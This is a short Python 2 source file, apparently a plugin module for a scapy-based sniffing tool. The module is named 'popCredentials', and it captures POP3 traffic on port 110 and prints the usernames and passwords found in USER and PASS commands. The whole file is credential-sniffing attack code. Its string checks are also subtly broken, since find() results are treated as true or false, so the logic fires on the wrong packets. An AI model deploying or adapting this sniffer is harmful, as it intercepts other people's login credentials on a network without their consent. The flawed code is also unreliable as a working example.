#!/usr/bin/python

from scapy.all import *

class module:

    def processPacket(self, packet):
        if packet.payload.dport == 110:
            data = packet.payload.payload.payload.fields["load"]
            if data.find("USER "):
                print "[+] POP user for %s : %s" % (packet.payload.dst, data.replace("USER ", ""))
            if data.find("PASS "):
                print "[+] POP pass for %s : %s" % (packet.payload.dst, data.replace("PASS ", ""))

    def getDescription(self):
        return "%s (%s)" % (self.moduleName, self.moduleDescription) 

    def __init__(self):
        self.moduleName = "popCredentials"
        self.moduleDescription = "Sniff POP credentials"
